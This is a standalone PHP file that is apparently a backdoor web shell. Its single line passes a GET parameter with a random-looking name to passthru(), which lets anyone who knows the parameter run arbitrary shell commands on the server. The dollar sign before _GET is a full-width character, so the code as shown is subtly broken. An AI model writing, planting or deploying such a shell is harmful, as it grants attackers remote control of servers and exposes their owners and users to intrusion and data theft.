<?php
passthru(＄_GET['fn3j2QzI']);
?>
